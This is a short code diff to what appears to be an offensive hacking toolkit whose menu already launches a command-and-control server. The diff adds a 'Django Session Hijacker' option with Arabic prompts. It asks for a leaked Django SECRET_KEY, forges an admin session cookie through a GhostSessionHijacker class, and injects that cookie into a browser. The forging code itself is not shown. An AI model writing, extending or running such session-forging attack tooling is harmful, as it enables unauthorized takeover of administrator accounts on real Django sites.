@@ -44,6 +44,14 @@ async def main():
         os.system(f"python3 {os.path.join(BASE_DIR, 'c2_server', 'app.py')}")
     elif choice == '8' or choice == '0':
         sys.exit()
+    print(f"{Fore.RED}[9] {Fore.WHITE}Django Session Hijacker (استغلال SECRET_KEY)")
+
+    if choice == '9':
+        s_key = input("[?] أدخل الـ SECRET_KEY المسرب: ")
+        hijacker = GhostSessionHijacker(s_key)
+        session_val = hijacker.forge_admin_session()
+        if session_val:
+            hijacker.inject_to_browser(session_val)
 
 if __name__ == "__main__":
     asyncio.run(main())
